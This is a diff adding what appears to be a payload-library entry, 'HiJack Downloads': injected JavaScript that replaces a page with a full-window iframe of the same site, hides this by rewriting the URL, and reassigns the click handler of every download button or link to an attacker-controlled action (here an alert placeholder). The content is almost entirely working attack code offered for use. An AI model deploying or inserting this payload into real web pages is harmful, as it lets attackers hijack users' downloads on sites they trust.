@@ -1,0 +1,45 @@
+HiJack Downloads
+
+------$$gr4y-r0se$$------
+
+Checks if the payload is already running, and if not, renders the application in an iFrame. Then, anytime the user navigates, updates the URL, and changes the onclick of any button or anchor tag to instead alert an attacker controlled message.
+
+------$$gr4y-r0se$$------
+
+text/javascript
+
+------$$gr4y-r0se$$------
+
+if (window.self === window.top) {
+
+    function newDownloadFunction(event) {
+        event.preventDefault();
+        alert('Download button hijacked');
+    }
+    function resizeIframe() {
+        const iframe = document.getElementById('hijacked');
+        iframe.style.width = window.innerWidth + 'px';
+        iframe.style.height = window.innerHeight + 'px';
+    }
+    function hijack_buttons() {
+        var iframe = document.getElementById('hijacked').contentWindow;
+        var url = new URL(iframe.location.href);
+        history.replaceState({}, '', url.pathname);
+        
+        var buttons = iframe.document.querySelectorAll(['button','a']);
+
+        buttons.forEach(button => {
+            if (button.textContent.trim().toLowerCase().includes('download')) {
+                button.onclick = newDownloadFunction;
+            }
+        });
+    }
+    var body = document.getElementsByTagName('body')[0];
+    const page_url = location.pathname;
+    body.innerHTML = '<iframe src="" id="hijacked"  scrolling="no" style="border: none;  overflow: hidden;"></iframe>';
+    resizeIframe();
+    const iframe = document.getElementById('hijacked');
+    iframe.addEventListener('load', hijack_buttons);
+    iframe.src = page_url;
+    window.addEventListener('resize', resizeIframe);
+}
